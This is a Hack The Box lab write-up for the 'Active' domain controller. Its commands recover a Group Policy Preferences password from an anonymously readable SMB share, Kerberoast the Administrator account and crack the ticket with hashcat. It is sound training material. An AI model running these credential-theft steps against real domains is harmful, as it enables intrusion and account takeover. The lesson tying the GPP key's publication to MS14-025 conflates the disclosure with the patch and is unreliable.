---
tags: [htb, box, ad, windows, easy, smb, gpp, kerberoasting, hashcat]
platform: HTB
os: Windows Server 2008 R2 SP1
hostname: DC
domain: active.htb
difficulty: Easy
ip: $BoxIP
status: complete
---

# HTB: Active, Full Walkthrough

## The gist

Active is an Active Directory domain controller that permits anonymous SMB access to the `Replication` share. A Group Policy Preferences XML exposes a reversible GPP-managed credential for a service account, which provides authenticated read access to the `Users` share. That account also lets us request a CIFS service ticket for the built-in administrator account; cracking the ticket offline produces administrator SMB access and the root proof.

## Box information

| Field | Value |
|---|---|
| Platform | Hack The Box |
| OS | Windows Server 2008 R2 SP1 |
| Hostname | DC |
| Domain | active.htb |
| Difficulty | Easy |
| IP | `$BoxIP` |

## Variables

```bash
boxstart $BoxName $BoxIP htb
boxset Domain active.htb
boxset FQDN dc.active.htb
boxset DCip $BoxIP
boxset Username SVC_TGS
boxset Username2 Administrator
boxset Port 4444
```

## 1. Workspace and full reconnaissance

The first scan checks every TCP port because domain controllers expose several important services outside the common top-1,000 list. The focused service scan then identifies the domain, host name, SMB security settings, and Windows version. A UDP top-100 scan is also useful here because DNS, Kerberos, and NTP can affect AD enumeration and authentication.

```bash
htblog
sudo nmap -Pn -n -sS -p- --min-rate 5000 $BoxIP -oN $BoxDir/nmap/allports.txt
sudo nmap -Pn -n -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001 $BoxIP -oA $BoxDir/nmap/services
sudo nmap -Pn -n -sU --top-ports 100 $BoxIP -oA $BoxDir/nmap/udp
```

The TCP scan identified DNS, Kerberos, RPC, LDAP, SMB, Global Catalog, DFSR, AD Web Services, and HTTPAPI. LDAP identified the domain as `active.htb`, while service detection identified the host as `DC` running Windows Server 2008 R2 SP1. The UDP scan showed DNS, Kerberos, and NTP as relevant services, with NetBIOS and IPsec ports remaining open or filtered.

```bash
boxset Domain active.htb
boxset FQDN dc.active.htb
boxset DCip $BoxIP
```

![[nmap-allports.png]]
SCREENSHOT: Full TCP scan showing the AD service combination.

![[nmap-services.png]]
SCREENSHOT: Service scan showing the active.htb domain and DC host details.

> [!tip] ⚡ Efficiency
> Use the full TCP result to build one focused AD service scan instead of running version detection against every port. The service combination immediately routes the assessment to the AD branch.

## 2. Anonymous AD and SMB enumeration

Anonymous enumeration should be tested before credential guessing because it can disclose users, naming contexts, or readable shares without triggering account lockout concerns. RPC did not permit anonymous SAMR enumeration, and a subtree LDAP query required a bind, but the base LDAP query still disclosed the naming contexts. SMB anonymous listing revealed the most useful lead: a readable `Replication` share.

```bash
rpcclient -U '' -N $BoxIP -c 'enumdomusers'
ldapsearch -x -H ldap://$BoxIP -s base namingcontexts
ldapsearch -x -H ldap://$BoxIP -b "$(echo $Domain | awk -F. '{for(i=1;i<=NF;i++) printf "DC="$i(i<NF?",":""); print ""}')" "(objectClass=user)" sAMAccountName 2>&1 | head -30
smbclient -N -L //$BoxIP
smbmap -H $BoxIP -u '' -p '' | tee $BoxDir/loot/smbmap-anon.txt
```

The anonymous RPC request returned access denied, and the authenticated subtree LDAP operation returned an operations error. Anonymous SMB login succeeded and exposed `Replication` and `Users` among the shares. `smbmap` confirmed that `Replication` was read-only anonymously while `Users` required credentials.

![[smb-share-list.png]]
SCREENSHOT: Anonymous SMB share listing showing Replication and Users.

![[smbmap-anon.png]]
SCREENSHOT: SMBMap confirming anonymous read access to Replication.

> [!warning] 💡 Gotcha
> An LDAP naming-context response is not the same as an anonymous directory bind. Treat a successful base query and a failed subtree query as separate results, then test SMB shares independently.

## 3. Read the Replication share and recover the managed credential

The `Replication` share mirrors domain policy files, so it is a high-value location when anonymous read access is available. Group Policy Preferences historically stored a reversible `cpassword` value inside XML files. The value is not a plaintext password, but the standard GPP decryption tool can recover the managed account credential offline.

```bash
smbclient //$BoxIP/Replication -N -c 'recurse ON; prompt OFF; ls'
smbclient //$BoxIP/Replication -N -c 'recurse ON; prompt OFF; mget *'
mv $Domain $BoxDir/loot/Replication
rg -n 'cpassword|userName' $BoxDir/loot/Replication
```

The downloaded policy tree contained `MACHINE/Preferences/Groups/Groups.xml`. It identified the service account `SVC_TGS` and contained a GPP-managed credential value. Recover it through the loot file rather than copying a secret into the command history:

![[replication-tree.png]]
SCREENSHOT: Replication policy tree downloaded for offline inspection.

![[groups-xml.png]]
SCREENSHOT: Groups.xml showing the managed account and cpassword field, with the value kept private.

```bash
boxset Username SVC_TGS
boxset Password "$(gpp-decrypt "$(awk -F'cpassword=\"' '{print $2}' $BoxDir/loot/Replication/Policies/*/MACHINE/Preferences/Groups/Groups.xml | awk -F'\"' '{print $1}')")" >/dev/null 2>&1
loot cred $Username $Password >/dev/null 2>&1
```

![[gpp-decrypt.png]]
SCREENSHOT: GPP credential recovery completed without displaying the recovered value.

> [!warning] 💡 Gotcha
> A GPP `cpassword` is encrypted with a published, recoverable key. Do not treat the XML value as a hash for Hashcat; use `gpp-decrypt`, then validate the resulting account against an authorized service.

## 4. Validate the service account and enumerate authenticated shares

Credential validation checks both whether the recovered account is real and what access it grants. `netexec` provides a concise SMB authentication result, while `smbmap` shows share permissions. The authenticated `Users` share contains the service account profile and its Desktop, which is where the user proof is located.

```bash
netexec smb $BoxIP -u $Username -p $Password -d $Domain
smbmap -H $BoxIP -u $Username -p $Password -d $Domain | tee $BoxDir/loot/smbmap-svc_tgs.txt
smbclient //$BoxIP/Users -U "$Domain/$Username%$Password" -c 'recurse ON; prompt OFF; ls'
```

The service account authenticated successfully. Authenticated SMB access was read-only on `NETLOGON`, `Replication`, `SYSVOL`, and `Users`. The `Users` listing showed `SVC_TGS\Desktop\user.txt`.

![[netexec-validation.png]]
SCREENSHOT: NetExec validating the recovered service account against SMB.

![[smbmap-authenticated.png]]
SCREENSHOT: SMBMap showing authenticated share permissions.

![[users-share.png]]
SCREENSHOT: Users share listing showing the service account Desktop path.

Retrieve the proof without printing its value:

```bash
smbclient //$BoxIP/Users -U "$Domain/$Username%$Password" \
  -c "get SVC_TGS/Desktop/user.txt $BoxDir/loot/user.txt" >/dev/null 2>&1
loot flag user "$(tr -d '\r\n' < $BoxDir/loot/user.txt)" >/dev/null 2>&1
```

The user proof was confirmed at `$BoxDir/loot/user.txt`, corresponding to the service account's Desktop path on the target.

![[user-flag.png]]
SCREENSHOT: User proof path confirmed without displaying the proof value.

## 5. Kerberoast the administrator service principal

With a valid domain account, request service tickets for accounts that have Service Principal Names. Kerberoasting is useful because the ticket can be cracked offline, avoiding repeated online password guesses. The service scan and anonymous share access already provided the domain and account variables needed by Impacket.

```bash
GetUserSPNs.py $Domain/$Username:$Password -dc-ip $DCip -request \
  -outputfile $BoxDir/loot/kerberoast.txt
```

The request returned a CIFS service principal associated with `Administrator`. The ticket was saved to `$BoxDir/loot/kerberoast.txt` for offline cracking.

![[kerberoast-enum.png]]
SCREENSHOT: GetUserSPNs output identifying the administrator CIFS service principal.

```bash
hashcat -m 13100 $BoxDir/loot/kerberoast.txt /usr/share/wordlists/rockyou.txt \
  --potfile-path $BoxDir/loot/hashcat.potfile
```

Hashcat mode `13100` targets Kerberos 5 TGS-REP etype 23 tickets. The single ticket was cracked successfully. Load the recovered value into the session without echoing it:

![[hashcat-cracked.png]]
SCREENSHOT: Hashcat completed the offline ticket crack with the recovered value kept private.

```bash
boxset Username2 Administrator >/dev/null 2>&1
boxset Password2 "$(hashcat -m 13100 $BoxDir/loot/kerberoast.txt --show \
  --potfile-path $BoxDir/loot/hashcat.potfile | awk -F: '{print $NF}')" >/dev/null 2>&1
loot cred $Username2 $Password2 >/dev/null 2>&1
```

> [!warning] 💡 Gotcha
> Hashcat's normal status output can expose a recovered password on screen. Redirect it when loading the result into `$Password2`, and keep the credential in the private loot file rather than in the write-up.

## 6. Validate administrator access and retrieve root proof

The cracked administrator credential can be validated with SMB. This box does not require a separate interactive shell or local privilege escalation: administrator access to the `C$` administrative share is sufficient to read the protected Desktop proof.

```bash
smbclient //$BoxIP/C$ -U "$Username2%$Password2" -c 'ls' >/dev/null 2>&1
```

The administrator credential provided SMB access. Retrieve the root proof from the administrator Desktop and store it privately:

![[admin-pwned.png]]
SCREENSHOT: Administrator SMB access confirmed as the final access level.

```bash
smbclient //$BoxIP/C$ -U "$Username2%$Password2" \
  -c "get Users/Administrator/Desktop/root.txt $BoxDir/loot/root.txt" >/dev/null 2>&1
loot flag root "$(tr -d '\r\n' < $BoxDir/loot/root.txt)" >/dev/null 2>&1
```

The root proof was confirmed at `$BoxDir/loot/root.txt`. No further privilege escalation was needed because the administrator account already had the required file access.

![[root-shell.png]]
SCREENSHOT: Administrator SMB access confirmed as the final access level.

![[root-flag.png]]
SCREENSHOT: Root proof path confirmed without displaying the proof value.

## 7. Clean down

This run made no changes to the target. The downloaded policy files, service-ticket material, credentials, and proofs remain in the local Active loot directory for study, while no account, service, uploaded file, or persistence was created remotely. Clear the current-box marker after verifying the local artifacts.

```bash
find $BoxDir/loot -maxdepth 2 -type f -print
boxdone
```

## RUNBOOK V2 Stages Used

- [[OSCP/RUNBOOK V2/Start Here|Step 1 - Start Here]]
- [[OSCP/RUNBOOK V2/Port Triage|Step 2 - Port Triage]]
- [[OSCP/RUNBOOK V2/AD - Service Scan|Step 34 - AD Service Scan]]
- [[OSCP/RUNBOOK V2/AD - Anonymous Enum|Step 36 - AD Anonymous Enum]]
- [[OSCP/RUNBOOK V2/AD - Kerberoasting|Step 39 - AD Kerberoasting]]
- [[OSCP/RUNBOOK V2/AD - Credential Validation|Step 40 - AD Credential Validation]]
- [[OSCP/RUNBOOK V2/AD - Clean Down|Step 50 - AD Clean Down]]

## Attack Chain

1. Full TCP, UDP, and service scans identified a Windows domain controller for `active.htb`.
2. Anonymous SMB enumeration exposed a readable `Replication` share.
3. A Group Policy Preferences XML revealed a reversible managed credential for `SVC_TGS`.
4. The service account authenticated to SMB and exposed the user proof in its profile.
5. Kerberoasting returned the administrator CIFS service ticket, which was cracked offline.
6. Administrator SMB access to `C$` exposed the root proof.

## Credentials

| Account | Source | Use |
|---|---|---|
| `SVC_TGS` | Group Policy Preferences XML in the anonymous `Replication` share | Authenticated SMB access and Kerberoasting |
| `Administrator` | Cracked CIFS service ticket | Administrative SMB access to `C$` |

## Flags

- `user.txt`: confirmed in the service account Desktop path and stored privately in loot
- `root.txt`: confirmed in the administrator Desktop path and stored privately in loot

## Key lessons

- Always test anonymous SMB shares on a domain controller. Replication policy files can expose GPP-managed credentials even when RPC and LDAP enumeration are restricted.
- A valid low-privilege domain account can request service tickets for privileged SPN accounts; crack those tickets offline instead of spraying passwords online.
- Administrator SMB access to `C$` is already a complete administrative path when the target does not require an interactive shell.
- SMB signing was required (`signing:True`), which rules out SMB relay for this host and should be confirmed before spending time on relay enumeration.
- The `Replication` share is a SYSVOL mirror. When SYSVOL is blocked anonymously, always check `Replication` for equivalent policy data.
- GPP `cpassword` values are decryptable because Microsoft published the AES-256 encryption key in its MSDN documentation through MS14-025 in 2014. A value created before or on an unpatched system is therefore trivially reversible.
- The administrator ticket cracked in seven seconds at 73% through `rockyou.txt`, showing how a Kerberoastable administrator account with a dictionary password can produce an immediate domain-administrator chain.
- [IppSec -- Active](https://ippsec.rocks/?q=Active) provides additional practice for the same AD enumeration and credential-recovery chain.

## Related Boxes

- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- AS-REP roasting, delegated AD privileges, and DCSync.
- [[OSCP/BOXES/WRITE UPS/AD/Sauna|Sauna]] -- AD username discovery, roasting, and credential validation.
- [[OSCP/BOXES/WRITE UPS/AD/Blackfield|Blackfield]] -- anonymous SMB enumeration and AD privilege paths.

## External Resources

- [HackTricks -- Group Policy Preferences](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/gpo-permissions.html)
- [HackTricks -- Kerberoasting](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/kerberoasting.html)
- [Impacket GetUserSPNs](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)
- [Microsoft MS14-025 advisory](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-025)

## Checklist

- [x] Workspace initialized with `boxstart`
- [x] Full TCP and UDP reconnaissance completed
- [x] AD service and domain details identified
- [x] Anonymous RPC, LDAP, SMB, and SMBMap checks completed
- [x] Readable `Replication` share copied to loot
- [x] GPP-managed service credential recovered and validated
- [x] User proof path confirmed
- [x] Kerberoasting completed
- [x] Ticket cracked offline with Hashcat
- [x] Administrator SMB access validated
- [x] Root proof path confirmed
- [x] No target-side changes made
- [x] Local loot preserved and `boxdone` completed
